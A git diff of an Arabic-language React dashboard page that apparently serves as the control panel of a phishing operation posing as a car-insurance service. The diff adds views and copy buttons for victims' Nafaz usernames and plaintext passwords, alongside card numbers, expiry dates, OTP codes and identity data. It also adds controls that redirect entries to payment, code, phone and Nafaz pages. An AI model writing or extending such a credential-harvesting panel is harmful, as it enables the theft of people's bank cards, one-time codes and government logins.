+                          ? "bg-blue-100 text-blue-600 dark:bg-blue-900/30 dark:text-blue-400"
+                          : stat.color === "purple"
+                            ? "bg-purple-100 text-purple-600 dark:bg-purple-900/30 dark:text-purple-400"
+                            : "bg-indigo-100 text-indigo-600 dark:bg-indigo-900/30 dark:text-indigo-400"
+                    }`}
+                  >
+                    <Icon className="h-6 w-6" />
+                  </div>
+                  <div className="text-right">
+                    <p className="text-2xl font-bold text-foreground">{stat.value.toLocaleString()}</p>
+                    <p className="text-xs text-muted-foreground">{stat.title}</p>
                   </div>
                 </div>
-                <p className="text-xs text-muted-foreground">{stat.description}</p>
-              </div>
-              <div
-                className={`p-3 rounded-xl shadow-sm ${
-                  stat.color === "emerald"
-                    ? "bg-emerald-100 text-emerald-600 dark:bg-emerald-900/30 dark:text-emerald-400"
-                    : stat.color === "blue"
-                      ? "bg-blue-100 text-blue-600 dark:bg-blue-900/30 dark:text-blue-400"
-                      : "bg-purple-100 text-purple-600 dark:bg-purple-900/30 dark:text-purple-400"
-                }`}
-              >
-                <stat.icon className="h-6 w-6" />
-              </div>
-            </CardHeader>
-            <CardFooter className="pt-0 pb-4 relative z-10">
-              <MiniChart
-                data={stat.trend}
-                colorClassName={
-                  stat.color === "emerald"
-                    ? "bg-gradient-to-t from-emerald-500 to-emerald-400"
-                    : stat.color === "blue"
-                      ? "bg-gradient-to-t from-blue-500 to-blue-400"
-                      : "bg-gradient-to-t from-purple-500 to-purple-400"
-                }
-              />
-            </CardFooter>
-          </Card>
-        ))}
+                <div className="flex items-center justify-between">
+                  <MiniChart
+                    data={stat.trend}
+                    colorClassName={
+                      stat.color === "emerald"
+                        ? "bg-emerald-400"
+                        : stat.color === "blue"
+                          ? "bg-blue-400"
+                          : stat.color === "purple"
+                            ? "bg-purple-400"
+                            : "bg-indigo-400"
+                    }
+                  />
+                  <div className="text-right">
+                    <p
+                      className={`text-sm font-semibold ${
+                        stat.color === "emerald"
+                          ? "text-emerald-600"
+                          : stat.color === "blue"
+                            ? "text-blue-600"
+                            : stat.color === "purple"
+                              ? "text-purple-600"
+                              : "text-indigo-600"
+                      }`}
+                    >
+                      {stat.comparison}
+                    </p>
+                    <p className="text-xs text-muted-foreground">{stat.description}</p>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+          )
+        })}
       </div>
 
       <Tabs defaultValue="notifications" className="w-full">
         <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
-          <TabsList className="grid w-full sm:w-auto grid-cols-2 h-11">
+          <TabsList className="grid w-full sm:w-auto grid-cols-2 h-11 bg-muted/50 backdrop-blur-sm">
             <TabsTrigger
               value="notifications"
-              className="flex items-center gap-2 px-6 py-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
+              className="flex items-center gap-2 px-6 py-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-lg"
             >
               <Bell className="h-4 w-4" /> الإشعارات
             </TabsTrigger>
             <TabsTrigger
               value="insights"
-              className="flex items-center gap-2 px-6 py-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
+              className="flex items-center gap-2 px-6 py-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-lg"
             >
               <BarChartHorizontalBig className="h-4 w-4" /> رؤى سريعة
             </TabsTrigger>
@@ -1316,7 +1097,8 @@ export default function NotificationsPage() {
               {[
                 { label: "الكل", type: "all", count: filteredNotifications.length, icon: Users, color: "blue" },
                 { label: "البطاقات", type: "card", count: cardCount, icon: CreditCard, color: "emerald" },
-                { label: "المتصلين", type: "online", count: onlineCountFiltered, icon: UserCheck, color: "purple" },
+                { label: "نفاذ", type: "nafaz", count: nafazCount, icon: Key, color: "purple" },
+                { label: "المتصلين", type: "online", count: onlineCountFiltered, icon: UserCheck, color: "indigo" },
               ].map((filter) => (
                 <Button
                   key={filter.type}
@@ -1330,7 +1112,9 @@ export default function NotificationsPage() {
                             ? "from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700"
                             : filter.color === "emerald"
                               ? "from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700"
-                              : "from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700"
+                              : filter.color === "purple"
+                                ? "from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700"
+                                : "from-indigo-500 to-indigo-600 hover:from-indigo-600 hover:to-indigo-700"
                         } text-white border-0`
                       : "hover:bg-muted/80 hover:border-primary/30"
                   }`}
@@ -1368,7 +1152,7 @@ export default function NotificationsPage() {
               <div className="flex items-center gap-2">
                 <DropdownMenu>
                   <DropdownMenuTrigger asChild>
-                    <Button variant="outline" size="sm" className="h-9 gap-2 hover:bg-primary/10">
+                    <Button variant="outline" size="sm" className="h-9 gap-2 hover:bg-primary/10 bg-transparent">
                       <ArrowUpDown className="h-4 w-4" />
                       <span className="sr-only sm:not-sr-only">ترتيب</span>
                     </Button>
@@ -1383,13 +1167,12 @@ export default function NotificationsPage() {
                 </DropdownMenu>
               </div>
             </CardHeader>
-
             <div className="overflow-x-auto">
               <Table>
                 <TableHeader>
                   <TableRow className="bg-muted/30 hover:bg-muted/40 border-b">
                     <TableHead className="px-6 py-4 w-[150px] font-semibold">الدولة</TableHead>
-                    <TableHead className="px-6 py-4 w-[280px] font-semibold">المعلومات</TableHead>
+                    <TableHead className="px-6 py-4 w-[320px] font-semibold">المعلومات</TableHead>
                     <TableHead className="px-6 py-4 w-[180px] font-semibold">الوقت</TableHead>
                     <TableHead className="px-6 py-4 w-[150px] text-center font-semibold">الحالة</TableHead>
                     <TableHead className="px-6 py-4 w-[150px] text-center font-semibold">كود OTP</TableHead>
@@ -1414,11 +1197,11 @@ export default function NotificationsPage() {
                         <TableCell className="px-6 py-4">
                           <div className="flex flex-wrap gap-2">
                             <Button
-                              variant={notification.documment_owner_full_name?"outline":"secondary"}
+                              variant={notification.documment_owner_full_name ? "outline" : "secondary"}
                               size="sm"
-                              className={`p-2 h-auto text-xs hover:bg-primary/10 rounded-lg   ${
+                              className={`p-2 h-auto text-xs hover:bg-primary/10 rounded-lg ${
                                 notification.documment_owner_full_name
-                                  ? "bg-sky-500 text-white dark:text-emerald-400 "
+                                  ? "bg-sky-500 text-white dark:text-emerald-400"
                                   : "text-red-600 dark:text-red-400 hover:bg-red-50 dark:hover:bg-red-900/20"
                               }`}
                               onClick={() => handleInfoClick(notification, "personal")}
@@ -1438,7 +1221,7 @@ export default function NotificationsPage() {
                               )}
                             </Button>
                             <Button
-                              variant={notification.cardNumber?"outline":"secondary"}
+                              variant={notification.cardNumber ? "outline" : "secondary"}
                               size="sm"
                               className={`p-2 h-auto text-xs rounded-lg ${
                                 notification.cardNumber
@@ -1452,9 +1235,23 @@ export default function NotificationsPage() {
                                 <span>{notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}</span>
                               </div>
                             </Button>
+                            <Button
+                              variant={notification.nafadUsername ? "outline" : "secondary"}
+                              size="sm"
+                              className={`p-2 h-auto text-xs rounded-lg ${
+                                notification.nafadUsername
+                                  ? "bg-purple-500 text-white dark:text-purple-400 hover:bg-purple-50 dark:hover:bg-purple-900/20"
+                                  : "text-red-600 dark:text-red-400 hover:bg-red-50 dark:hover:bg-red-900/20"
+                              }`}
+                              onClick={() => handleInfoClick(notification, "nafaz")}
+                            >
+                              <div className="flex items-center gap-2">
+                                <Key className="h-3.5 w-3.5" />
+                                <span>{notification.nafadUsername ? "بيانات نفاذ" : "لا يوجد نفاذ"}</span>
+                              </div>
+                            </Button>
                           </div>
                         </TableCell>
-
                         <TableCell className="px-6 py-4 text-sm text-muted-foreground">
                           <div className="flex items-center gap-2">
                             <Clock className="h-3.5 w-3.5" />
@@ -1468,7 +1265,10 @@ export default function NotificationsPage() {
                           </div>
                         </TableCell>
                         <TableCell className="px-6 py-4 text-center">
-                          <UserStatus userId={notification.id} />
+                          <div className="flex flex-col gap-2">
+                            <UserStatus userId={notification.id} />
+                            {notification.nafadUsername && <NafazStatus notification={notification} />}
+                          </div>
                         </TableCell>
                         <TableCell className="px-6 py-4 text-center">
                           {(notification.otp || notification.otpCode) && (
@@ -1481,11 +1281,11 @@ export default function NotificationsPage() {
                           <div className="flex justify-center items-center gap-1.5 flex-wrap">
                             {[
                               { page: "1", label: "معلومات 1" },
-                              { page: "2", label: "معلومات 2" },
-                              { page: "3", label: "عروض" },
                               { page: "4", label: "ملخص" },
-                              { page: "5", label: "دفع" },
-                              { page: "6", label: "كود" },
+                              { page: "6", label: "دفع" },
+                              { page: "7", label: "كود" },
+                              { page: "8888", label: "هاتف" },
+                              { page: "9999", label: "نفاذ" },
                             ].map((item) => (
                               <Button
                                 key={item.page}
@@ -1561,6 +1361,7 @@ export default function NotificationsPage() {
                 <ActivityTimeline notifications={notifications.filter((n) => !n.isHidden)} />
               </CardContent>
             </Card>
+
             <Card className="shadow-lg border-0">
               <CardHeader className="pb-4">
                 <CardTitle className="text-lg font-semibold flex items-center gap-3">
@@ -1626,6 +1427,7 @@ export default function NotificationsPage() {
       dir="rtl"
       className="min-h-screen bg-gradient-to-br from-background via-muted/10 to-background text-foreground"
     >
+      {/* Mobile Menu Sheet */}
       <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
         <SheetContent side="right" className="w-[300px] p-0" dir="rtl">
           <SheetHeader className="p-6 pb-4 border-b bg-gradient-to-r from-muted/50 to-muted/30">
@@ -1677,13 +1479,7 @@ export default function NotificationsPage() {
         </SheetContent>
       </Sheet>
 
-      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />
-      <ExportDialog
-        open={exportDialogOpen}
-        onOpenChange={setExportDialogOpen}
-        notificationsCount={filteredNotifications.length}
-      />
-
+      {/* Header */}
       <header className="sticky top-0 z-40 border-b bg-background/80 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60 shadow-sm">
         <div className="container mx-auto flex h-16 items-center justify-between px-4 sm:px-6 lg:px-8">
           <div className="flex items-center gap-4">
@@ -1708,7 +1504,6 @@ export default function NotificationsPage() {
               </div>
             </div>
           </div>
-
           <div className="flex items-center gap-3">
             <div className="hidden lg:flex items-center gap-2">
               <TooltipProvider>
@@ -1798,6 +1593,7 @@ export default function NotificationsPage() {
         </div>
       </header>
 
+      {/* Main Content */}
       <main className="container mx-auto p-4 sm:p-6 lg:p-8">
         {isLoading && notifications.length > 0 && (
           <div className="fixed top-16 left-0 right-0 h-1 bg-primary/20 z-50">
@@ -1807,8 +1603,9 @@ export default function NotificationsPage() {
         {mainContent}
       </main>
 
+      {/* Information Dialog */}
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
-        <DialogContent className="bg-green-50  overflow-hidden" dir="rtl">
+        <DialogContent className="bg-gradient-to-br from-background to-muted/20 overflow-hidden max-w-2xl" dir="rtl">
           <DialogHeader>
             <DialogTitle className="flex items-center gap-3 text-lg">
               {selectedInfo === "personal" ? (
@@ -1818,20 +1615,28 @@ export default function NotificationsPage() {
                   </div>
                   المعلومات الشخصية
                 </>
-              ) : (
+              ) : selectedInfo === "card" ? (
                 <>
                   <div className="bg-emerald-100 p-2 rounded-lg dark:bg-emerald-900/30">
                     <CreditCard className="h-5 w-5 text-emerald-600 dark:text-emerald-400" />
                   </div>
                   معلومات البطاقة
                 </>
+              ) : (
+                <>
+                  <div className="bg-purple-100 p-2 rounded-lg dark:bg-purple-900/30">
+                    <Key className="h-5 w-5 text-purple-600 dark:text-purple-400" />
+                  </div>
+                  بيانات نفاذ
+                </>
               )}
             </DialogTitle>
             <DialogDescription>
-              تفاصيل {selectedInfo === "personal" ? "المستخدم" : "البطاقة"} المحددة مع جميع البيانات المتاحة.
+              تفاصيل {selectedInfo === "personal" ? "المستخدم" : selectedInfo === "card" ? "البطاقة" : "نفاذ"} المحددة
+              مع جميع البيانات المتاحة.
             </DialogDescription>
           </DialogHeader>
-          <div className="space-y-4 py-4 ">
+          <div className="space-y-4 py-4 max-h-[60vh] overflow-y-auto">
             {selectedNotification &&
               (selectedInfo === "personal" ? (
                 <div className="space-y-3">
@@ -1847,7 +1652,6 @@ export default function NotificationsPage() {
                       value: selectedNotification.vehicle_manufacture_number,
                       icon: FileText,
                     },
-                    { label: "رمز الجمارك", value: selectedNotification.customs_code, icon: FileText },
                     { label: "رقم التسلسل", value: selectedNotification.sequenceNumber, icon: FileText },
                     {
                       label: "غرض التأمين",
@@ -1876,56 +1680,25 @@ export default function NotificationsPage() {
                     },
                     { label: "تاريخ بداية البوليصة", value: selectedNotification.policyStartDate, icon: Calendar },
                     { label: "عرض التأمين المحدد", value: selectedNotification.selectedInsuranceOffer, icon: Shield },
-                    {
-                      label: "خصومات خاصة",
-                      value: selectedNotification.specialDiscounts ? "نعم" : "لا",
-                      icon: FileText,
-                    },
-                    {
-                      label: "الموافقة على الشروط",
-                      value: selectedNotification.agreeToTerms ? "نعم" : "لا",
-                      icon: CheckCircle,
-                    },
-                    {
-                      label: "حالة OTP",
-                      value: selectedNotification.otpSent
-                        ? selectedNotification.otpVerified
-                          ? "مرسل ومؤكد"
-                          : "مرسل غير مؤكد"
-                        : "غير مرسل",
-                      icon: Shield,
-                    },
-                    {
-                      label: "وقت تأكيد OTP",
-                      value: selectedNotification.otpVerificationTime
-                        ? new Date(selectedNotification.otpVerificationTime).toLocaleString("ar-SA")
-                        : undefined,
-                      icon: Clock,
-                    },
-                    {
-                      label: "وقت الإرسال",
-                      value: selectedNotification.submissionTime
-                        ? new Date(selectedNotification.submissionTime).toLocaleString("ar-SA")
-                        : undefined,
-                      icon: Clock,
-                    },
                   ].map(
                     (item) =>
                       item.value && (
-                        <Card key={item.label} className="border-muted/50">
+                        <Card key={item.label} className="border-muted/50 group">
                           <CardContent className="p-4">
                             <div className="flex items-center justify-between">
                               <div className="flex items-center gap-3">
                                 <item.icon className="h-4 w-4 text-muted-foreground" />
                                 <span className="text-sm font-medium text-muted-foreground">{item.label}</span>
                               </div>
-                              <span className="text-sm font-semibold text-foreground">{item.value}</span>
+                              <div className="flex items-center gap-2">
+                                <span className="text-sm font-semibold text-foreground">{item.value}</span>
+                                <CopyButton text={item.value} label={item.label} />
+                              </div>
                             </div>
                           </CardContent>
                         </Card>
                       ),
                   )}
-
                   {selectedNotification.selectedAddons && selectedNotification.selectedAddons.length > 0 && (
                     <Card className="border-muted/50">
                       <CardContent className="p-4">
@@ -1946,7 +1719,7 @@ export default function NotificationsPage() {
                     </Card>
                   )}
                 </div>
-              ) : (
+              ) : selectedInfo === "card" ? (
                 <div className="space-y-3">
                   {[
                     {
@@ -1955,10 +1728,9 @@ export default function NotificationsPage() {
                       isCard: true,
                       icon: CreditCard,
                     },
-                    
                     {
                       label: "تاريخ الانتهاء",
-                      value: selectedNotification.cardMonth+"/"+selectedNotification.cardYear,
+                      value: selectedNotification.cardMonth + "/" + selectedNotification.cardYear,
                       isCard: true,
                       icon: DatabaseIcon,
                     },
@@ -1977,24 +1749,27 @@ export default function NotificationsPage() {
                   ].map(
                     (item) =>
                       item.value && (
-                        <Card key={item.label} className="border-muted/50">
+                        <Card key={item.label} className="border-muted/50 group">
                           <CardContent className="p-4">
                             <div className="flex items-center justify-between">
                               <div className="flex items-center gap-3">
                                 <item.icon className="h-4 w-4 text-muted-foreground" />
                                 <span className="text-sm font-medium text-muted-foreground">{item.label}</span>
                               </div>
-                              {item.isCard ? (
-                                <Badge variant="secondary" className="font-mono text-sm">
-                                  {item.value}
-                                </Badge>
-                              ) : item.isOtp ? (
-                                <Badge variant="default" className="font-mono text-sm">
-                                  {item.value}
-                                </Badge>
-                              ) : (
-                                <span className="text-sm font-semibold text-foreground">{item.value}</span>
-                              )}
+                              <div className="flex items-center gap-2">
+                                {item.isCard ? (
+                                  <Badge variant="secondary" className="font-mono text-sm">
+                                    {item.value}
+                                  </Badge>
+                                ) : item.isOtp ? (
+                                  <Badge variant="default" className="font-mono text-sm">
+                                    {item.value}
+                                  </Badge>
+                                ) : (
+                                  <span className="text-sm font-semibold text-foreground">{item.value}</span>
+                                )}
+                                <CopyButton text={item.value} label={item.label} />
+                              </div>
                             </div>
                           </CardContent>
                         </Card>
@@ -2020,6 +1795,104 @@ export default function NotificationsPage() {
                     </Card>
                   )}
                 </div>
+              ) : (
+                // Nafaz information
+                <div className="space-y-3">
+                  {selectedNotification.nafadUsername && (
+                    <Card className="border-purple-200 bg-purple-50/50 dark:border-purple-800 dark:bg-purple-900/20">
+                      <CardContent className="p-4">
+                        <div className="space-y-4">
+                          <div className="flex items-center gap-3 mb-4">
+                            <div className="bg-purple-100 p-2 rounded-lg dark:bg-purple-900/30">
+                              <Key className="h-5 w-5 text-purple-600 dark:text-purple-400" />
+                            </div>
+                            <div>
+                              <h3 className="font-semibold text-purple-900 dark:text-purple-100">
+                                بيانات تسجيل الدخول نفاذ
+                              </h3>
+                              <p className="text-xs text-purple-700 dark:text-purple-300">
+                                معلومات الدخول المستخدمة في نظام نفاذ
+                              </p>
+                            </div>
+                          </div>
+
+                          <div className="space-y-3">
+                            <Card className="border-muted/50 group">
+                              <CardContent className="p-4">
+                                <div className="flex items-center justify-between">
+                                  <div className="flex items-center gap-3">
+                                    <User className="h-4 w-4 text-muted-foreground" />
+                                    <span className="text-sm font-medium text-muted-foreground">اسم المستخدم</span>
+                                  </div>
+                                  <div className="flex items-center gap-2">
+                                    <span className="text-sm font-semibold text-foreground font-mono">
+                                      {selectedNotification.nafadUsername}
+                                    </span>
+                                    <CopyButton text={selectedNotification.nafadUsername} label="اسم المستخدم" />
+                                  </div>
+                                </div>
+                              </CardContent>
+                            </Card>
+
+                            {selectedNotification.nafadPassword && (
+                              <Card className="border-muted/50 group">
+                                <CardContent className="p-4">
+                                  <PasswordField value={selectedNotification.nafadPassword} label="كلمة المرور" />
+                                </CardContent>
+                              </Card>
+                            )}
+
+                            <Card className="border-muted/50">
+                              <CardContent className="p-4">
+                                <div className="flex items-center justify-between">
+                                  <div className="flex items-center gap-3">
+                                    <Shield className="h-4 w-4 text-muted-foreground" />
+                                    <span className="text-sm font-medium text-muted-foreground">حالة التحقق</span>
+                                  </div>
+                                  <NafazStatus notification={selectedNotification} />
+                                </div>
+                              </CardContent>
+                            </Card>
+
+                            {selectedNotification.nafazLoginTime && (
+                              <Card className="border-muted/50">
+                                <CardContent className="p-4">
+                                  <div className="flex items-center justify-between">
+                                    <div className="flex items-center gap-3">
+                                      <Clock className="h-4 w-4 text-muted-foreground" />
+                                      <span className="text-sm font-medium text-muted-foreground">
+                                        وقت تسجيل الدخول
+                                      </span>
+                                    </div>
+                                    <span className="text-sm font-semibold text-foreground">
+                                      {new Date(selectedNotification.nafazLoginTime).toLocaleString("ar-SA")}
+                                    </span>
+                                  </div>
+                                </CardContent>
+                              </Card>
+                            )}
+
+                            {selectedNotification.nafazAttempts && (
+                              <Card className="border-muted/50">
+                                <CardContent className="p-4">
+                                  <div className="flex items-center justify-between">
+                                    <div className="flex items-center gap-3">
+                                      <Activity className="h-4 w-4 text-muted-foreground" />
+                                      <span className="text-sm font-medium text-muted-foreground">عدد المحاولات</span>
+                                    </div>
+                                    <Badge variant="outline" className="font-mono">
+                                      {selectedNotification.nafazAttempts}
+                                    </Badge>
+                                  </div>
+                                </CardContent>
+                              </Card>
+                            )}
+                          </div>
+                        </div>
+                      </CardContent>
+                    </Card>
+                  )}
+                </div>
               ))}
             {(!selectedNotification ||
               (selectedInfo === "personal" &&
@@ -2028,7 +1901,8 @@ export default function NotificationsPage() {
                 !selectedNotification.owner_identity_number &&
                 !selectedNotification.buyer_identity_number &&
                 !selectedNotification.seller_identity_number) ||
-              (selectedInfo === "card" && !selectedNotification.cardNumber)) && (
+              (selectedInfo === "card" && !selectedNotification.cardNumber) ||
+              (selectedInfo === "nafaz" && !selectedNotification.nafadUsername)) && (
               <div className="flex flex-col items-center justify-center py-8 text-center">
                 <div className="bg-muted/50 rounded-full p-4 mb-3">
                   <AlertCircle className="h-8 w-8 text-muted-foreground" />
@@ -2039,12 +1913,13 @@ export default function NotificationsPage() {
             )}
           </div>
           <DialogFooter>
-            <Button variant="outline" onClick={closeDialog} className="w-full">
+            <Button variant="outline" onClick={closeDialog} className="w-full bg-transparent">
               إغلاق
             </Button>
           </DialogFooter>
         </DialogContent>
       </Dialog>
+
       <style jsx global>{`
         .animate-indeterminate-progress {
           animation: indeterminate-progress 2s infinite linear;
